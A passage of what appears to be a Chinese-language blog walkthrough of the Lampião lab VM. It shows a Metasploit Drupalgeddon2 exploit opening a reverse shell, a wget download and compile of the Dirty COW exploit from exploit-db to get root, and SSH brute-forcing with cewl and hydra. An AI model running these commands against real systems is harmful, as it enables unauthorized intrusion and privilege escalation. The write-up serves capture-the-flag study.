class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; search drupal</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                                           Disclosure Date  Rank       Description</span><br><span class="line">   ----                                           ---------------  ----       -----------</span><br><span class="line">   auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Drupal OpenID External Entity Injection</span><br><span class="line">   auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Drupal Views Module Users Enumeration</span><br><span class="line">   exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  Drupal HTTP Parameter Key/Value SQL Injection</span><br><span class="line">   exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Drupal CODER Module Remote Command Execution</span><br><span class="line">   exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Drupal Drupalgeddon 2 Forms API Property Injection</span><br><span class="line">   exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Drupal RESTWS Module Remote PHP Code Execution</span><br><span class="line">   exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  PHP XML-RPC Arbitrary Code Execution</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf &gt; use exploit/unix/webapp/drupal_drupalgeddon2</span><br><span class="line">msf exploit(unix/webapp/drupal_drupalgeddon2) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (exploit/unix/webapp/drupal_drupalgeddon2):</span><br><span class="line"></span><br><span class="line">   Name         Current Setting  Required  Description</span><br><span class="line">   ----         ---------------  --------  -----------</span><br><span class="line">   DUMP_OUTPUT  false            no        If output should be dumped</span><br><span class="line">   PHP_FUNC     passthru         yes       PHP function to execute</span><br><span class="line">   Proxies                       no        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOST                         yes       The target address</span><br><span class="line">   RPORT        80               yes       The target port (TCP)</span><br><span class="line">   SSL          false            no        Negotiate SSL/TLS for outgoing connections</span><br><span class="line">   TARGETURI    /                yes       Path to Drupal install</span><br><span class="line">   VHOST                         no        HTTP server virtual host</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic (PHP In-Memory)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rhost 192.168.214.133</span><br><span class="line">rhost =&gt; 192.168.214.133</span><br><span class="line">msf exploit(unix/webapp/drupal_drupalgeddon2) &gt; set rport 1898</span><br><span class="line">rport =&gt; 1898</span><br><span class="line">msf exploit(unix/webapp/drupal_drupalgeddon2) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.214.132:4444</span><br><span class="line">[*] Drupal 7 targeted at http://192.168.214.133:1898/</span><br><span class="line">[+] Drupal appears unpatched in CHANGELOG.txt</span><br><span class="line">[*] Sending stage (37775 bytes) to 192.168.214.133</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.214.132:4444 -&gt; 192.168.214.133:34156) at 2018-09-28 05:59:05 -0400</span><br><span class="line"></span><br><span class="line">meterpreter &gt; shell</span><br><span class="line">Process 15073 created.</span><br><span class="line">Channel 0 created.</span><br><span class="line">id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br><span class="line">cd /tmp</span><br><span class="line">ls</span><br><span class="line">wget http://www.exploit-db.com/download/40847.cpp</span><br><span class="line">--2018-09-28 07:37:08--  http://www.exploit-db.com/download/40847.cpp</span><br><span class="line">Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.8</span><br><span class="line">Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 301 Moved Permanently</span><br><span class="line">Location: https://www.exploit-db.com/download/40847.cpp [following]</span><br><span class="line">--2018-09-28 07:37:09--  https://www.exploit-db.com/download/40847.cpp</span><br><span class="line">Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.8|:443... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: unspecified [application/txt]</span><br><span class="line">Saving to: &apos;40847.cpp&apos;</span><br><span class="line"></span><br><span class="line">     0K ..........                                             2.43M=0.004s</span><br><span class="line"></span><br><span class="line">2018-09-28 07:37:10 (2.43 MB/s) - &apos;40847.cpp&apos; saved [10531]</span><br><span class="line"></span><br><span class="line">ls</span><br><span class="line">40847.cpp</span><br><span class="line">g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</span><br><span class="line"></span><br><span class="line">ls</span><br><span class="line">40847.cpp</span><br><span class="line">dcow</span><br><span class="line">chmod +x dcow</span><br><span class="line">./dcow</span><br><span class="line">Running ...</span><br><span class="line">Received su prompt (Password: )</span><br><span class="line">Root password is:   dirtyCowFun</span><br><span class="line">Enjoy! :-)</span><br><span class="line">python -c&apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</span><br><span class="line">www-data@lampiao:/var/www/html$ su</span><br><span class="line">su</span><br><span class="line">Password: dirtyCowFun</span><br><span class="line"></span><br><span class="line">root@lampiao:/var/www/html# cat ~/flag.txt</span><br><span class="line">cat ~/flag.txt</span><br><span class="line">9740616875908d91ddcdaa8aea3af366</span><br></pre></td></tr></table></figure>
+
+<h2 id="ssh登陆"><a href="#ssh登陆" class="headerlink" title="ssh登陆"></a>ssh登陆</h2><p>浏览网站能发现<code>tiago</code>和<code>eder</code>这两个用户名，联系nmap扫描发现ssh服务是开启的，试试爆破用户名和密码</p>
+<p>使用<code>cewl</code> 生成密码字典</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cewl -w dict.txt http://192.168.214.133:1898/?q=node/1</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>hydra</code>爆破</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l tiago -P dict.txt -vV -e ns 192.168.214.133 ssh</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[22][ssh] host: 192.168.214.133   login: tiago   password: Virgulino</span><br></pre></td></tr></table></figure>
+
+<p>得到密码，ssh登陆得到shell</p>
+<p>然后同上用脏牛提权</p>
+<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p><code>/var/www/html/sites/default/settings.php</code>是配置文件，有数据库的密码信息，这个密码和<code>tiago</code>用户的登陆密码是一样的</p>
+<p>扫描能发现<code>/CHANGELOG.txt</code>，是敏感文件，写着drupal的版本信息</p>
+
+  </article>
+</div>
+
+
+    
+
+
+
+
+</div>
+
+<div class="footer-wrapper container">
+  <footer class="footer clearfix">
+    <div class="clearfix">
+    <a href="https://daolgts.github.io" class="footer-logo">
+      <i class="fa fa-github"></i>
+    </a>
+    <ul class="footer-social-link">
+      <li>© 2019 daolgts</li>
+      <li><a href="https://daolgts.github.io">Home</a></li>
+      
+      <li><a href="https://github.com/daolgts">Github</a></li>
+      
+    </ul>
+    <div class="footer-theme-info">
+      Theme <a href="//github.com/sabrinaluo/hexo-theme-replica">Replica</a>
+      by <a href="//github.com/sabrinaluo">Hiitea</a> ❤ Powered by Hexo
+    </div>
+    </div>
+    
+  </footer>
+</div>
+
+
+
+
+<script src="/js/main.js"></script>
+
+</body>
+</html>
